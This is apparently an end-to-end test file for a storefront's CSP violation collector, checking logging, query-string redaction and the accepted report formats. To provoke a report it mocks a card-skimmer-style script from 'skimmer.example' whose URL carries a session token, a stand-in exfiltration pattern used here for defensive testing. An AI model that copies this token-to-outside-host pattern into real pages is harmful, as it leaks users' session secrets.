/*
 * The storefront's report-only CSP has a collector (hunt w5-security csp-reporting): vercel.json points
 * `report-uri` (and, for Chromium on HTTPS, `report-to csp` + Reporting-Endpoints) at /api/store/csp-report,
 * which the /api rewrite hands to the CMS (cms/src/endpoints/csp). Here, on the production CMS build:
 *
 * - a real Chromium page with that policy reports a disallowed script, the report travels through the
 *   storefront origin's /api proxy, and the CMS logs one `csp violation` line with the directive, the
 *   blocked script and the page, cut to origin + path (the page's ?t= guest token and the script's query
 *   never reach the log);
 * - both report formats get 204; anything else is refused.
 *
 * The page is served by page.route with the vercel.json policy minus `report-to`: the stack is plain http,
 * where Chromium has no Reporting API, and with `report-to` present it ignores `report-uri`.
 */
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { test, expect } from '../fixtures.js';

const VERCEL = JSON.parse(fs.readFileSync(new URL('../../../vercel.json', import.meta.url), 'utf8'));
const REPORT_ONLY = VERCEL.headers
	.find((r) => r.source === '/(.*)')
	.headers.find((h) => h.key === 'Content-Security-Policy-Report-Only').value;
const COLLECTOR = '/api/store/csp-report';

// eslint-disable-next-line no-control-regex
const strip = (s) => s.replace(/\u001b\[[0-9;]*m/g, '');
const logSize = (file) => fs.statSync(file).size;
const logSince = (file, offset) => strip(fs.readFileSync(file, 'utf8').slice(offset));

test('a violation on a storefront page reaches the CMS log, without query strings', async ({ page, stack, consoleErrors }) => {
	consoleErrors.allow(/Content Security Policy|Report Only/i); // Chromium prints each report-only violation
	const log = path.join(stack.logsDir, 'cms.log');
	const offset = logSize(log);
	const id = crypto.randomBytes(5).toString('hex');
	const secret = `GUEST${id.toUpperCase()}`;
	const policy = REPORT_ONLY.split(';')
		.map((d) => d.trim())
		.filter((d) => !/^report-to\b/.test(d))
		.join('; ');
	expect(policy).toContain(`report-uri ${COLLECTOR}`);

	await page.route(`https://skimmer.example/**`, (route) =>
		route.fulfill({ status: 200, contentType: 'text/javascript', body: 'window.__skim = 1' })
	);
	await page.route(`${stack.sfUrl}/csp-probe-${id}**`, (route) =>
		route.fulfill({
			status: 200,
			headers: { 'content-type': 'text/html; charset=utf-8', 'content-security-policy-report-only': policy },
			body: `<!doctype html><title>probe</title><script src="https://skimmer.example/skim-${id}.js?session=${secret}"></script><p>probe</p>`
		})
	);
	await page.goto(`${stack.sfUrl}/csp-probe-${id}?no=WF-1&t=${secret}`);
	expect(await page.evaluate(() => window.__skim)).toBe(1); // report-only: it ran, and was reported

	await expect
		.poll(() => logSince(log, offset).includes(`skim-${id}.js`), { timeout: 15_000, message: 'the CMS logged the report' })
		.toBe(true);
	const text = logSince(log, offset);
	expect(text).toMatch(/INFO.*csp violation/);
	expect(text).toContain(`https://skimmer.example/skim-${id}.js`);
	expect(text).toContain(`${stack.sfUrl}/csp-probe-${id}`);
	expect(text).toContain('script-src-elem');
	expect(text).not.toContain(secret);
	expect(text).not.toMatch(/ERROR/);
});

test('the collector through the storefront /api: both formats 204, other bodies refused', async ({ stack }) => {
	const post = (body, type) =>
		fetch(`${stack.sfUrl}${COLLECTOR}`, { method: 'POST', headers: type ? { 'content-type': type } : {}, body });
	const legacy = JSON.stringify({
		'csp-report': {
			'document-uri': `${stack.sfUrl}/checkout`,
			'effective-directive': 'connect-src',
			'blocked-uri': 'https://tracker.example/beacon',
			disposition: 'report'
		}
	});
	const modern = JSON.stringify([
		{ type: 'csp-violation', age: 0, url: `${stack.sfUrl}/`, body: { documentURL: `${stack.sfUrl}/`, effectiveDirective: 'img-src', blockedURL: 'inline', disposition: 'report' } }
	]);
	for (const [body, type] of [
		[legacy, 'application/csp-report'],
		[modern, 'application/reports+json']
	]) {
		const res = await post(body, type);
		expect(res.status, type).toBe(204);
		expect(await res.text()).toBe('');
	}
	expect((await post(legacy, 'text/plain')).status).toBe(415);
	expect((await post('{"csp-report":', 'application/csp-report')).status).toBe(400);
	expect((await post('{"hello":1}', 'application/json')).status).toBe(400);
	expect((await post(JSON.stringify({ 'csp-report': { x: 'y'.repeat(70 * 1024) } }), 'application/csp-report')).status).toBe(413);
});
